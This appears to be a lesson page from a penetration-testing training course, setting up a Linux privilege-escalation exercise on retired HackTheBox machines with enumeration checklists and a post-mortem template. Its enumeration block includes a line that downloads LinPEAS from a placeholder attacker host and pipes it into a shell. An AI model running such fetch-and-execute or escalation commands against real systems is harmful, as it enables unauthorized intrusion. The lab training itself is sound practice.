---
title: "Infrastructure Practice Day 3 — Linux PrivEsc HTB Machine (Easy)"
tags: [practice, linux, privilege-escalation, HTB, SUID, sudo, cron, LinPEAS,
       hands-on, T1548, T1053, ATT&CK]
module: 04-BroadSurface-04
day: 247
related_topics:
  - Linux PrivEsc Enumeration (Day 234)
  - Linux PrivEsc Lab 1 — SUID and Sudo (Day 235)
  - Linux PrivEsc Lab 2 — Cron and Writable Files (Day 236)
  - Infrastructure Practice Day 4 (Day 248)
---

# Day 247 — Infrastructure Practice Day 3: Linux PrivEsc HTB Machine (Easy)

> "Easy machines on HackTheBox teach the fundamentals with real-world styling.
> The vulnerability is not labelled. The hints do not exist. The correct path
> rewards methodical enumeration. If you follow the checklist you built in Day 234,
> something will turn up. It always does."
>
> — Ghost

---

## Goals

By the end of today's session you will have:

1. Rooted a Linux HackTheBox machine rated Easy using the enumeration methodology.
2. Written a structured post-mortem documenting the path from foothold to root.
3. Identified what detection artefact your escalation path would have left.

**Time budget:** 5–6 hours.

---

## Target Selection

Choose one of these recommended HTB Linux machines (Easy, retired — accessible on VIP):

| Machine | Key technique | Why recommended |
|---|---|---|
| **Lame** | Samba exploit → SUID abuse | Classic first root |
| **Bashed** | Web shell → sudo NOPASSWD | sudo abuse in a realistic web context |
| **Shocker** | Shellshock + SUID or sudo | CVE-based initial access + Linux privesc |
| **Nibbles** | CMS exploit + sudo | sudo misconfiguration with a writable script |
| **Beep** | Elastix RCE + LFI → privesc | Multi-path escalation |

Alternative: use the provided lab container with a similar configuration.

---

## Workflow Template

### Phase 1 — Initial Foothold (not the focus today — use a walkthrough hint if stuck here)

```
[ ] Service enumeration: nmap -sCV -p- <target-ip> | tee nmap-full.txt
[ ] Exploit identified and executed
[ ] Low-privilege shell obtained as: ___
[ ] Current user: id output: ___
```

### Phase 2 — Enumeration (this is the focus)

```bash
# Run in order — no skipping steps:
id && groups
sudo -l
find / -perm -4000 -type f 2>/dev/null | sort
getcap -r / 2>/dev/null
cat /etc/crontab; ls /etc/cron.d/
# Transfer and run LinPEAS:
wget http://<attacker-ip>:8000/linpeas.sh | sh 2>/dev/null | tee /tmp/lpe.txt
```

```
[ ] Identity confirmed
[ ] sudo -l output: ___
[ ] Non-standard SUID binaries found: ___
[ ] Capabilities found: ___
[ ] Cron jobs visible: ___
[ ] LinPEAS RED findings: ___
```

### Phase 3 — Exploitation

```
[ ] Escalation path identified: ___ (SUID / sudo / cron / capability / other)
[ ] Exploitation attempted
[ ] Root shell obtained
[ ] Proof: cat /root/root.txt = ___
```

---

## Post-Mortem Report

Write this immediately after rooting the machine:

```
Machine: ___
Difficulty: Easy
Total time: ___ min

Foothold:
  Service: ___
  Exploit: ___
  Shell as: ___

Privilege Escalation:
  Path: ___
  Root cause (why did this misconfiguration exist?): ___
  Exact command that gave root: ___

Detection:
  What event would this path create in auditd or syslog?
  ___

What took the longest? ___
What would you do differently? ___
```

---

## Self-Assessment

| Skill | Confident? |
|---|---|
| Ran all enumeration checks without notes | Y / N |
| Identified escalation path from LinPEAS output alone | Y / N |
| Executed the escalation without looking up the command | Y / N |
| Time from shell to root < 30 min | Y / N |

---

## Questions

> Add your questions here. Each question gets a Global ID (Q247.1, Q247.2 …).

---

## Navigation

← Previous: [Day 246 — Infrastructure Practice Day 2](DAY-0246-Infrastructure-Practice-Day-2.md)
→ Next: [Day 248 — Infrastructure Practice Day 4](DAY-0248-Infrastructure-Practice-Day-4.md)
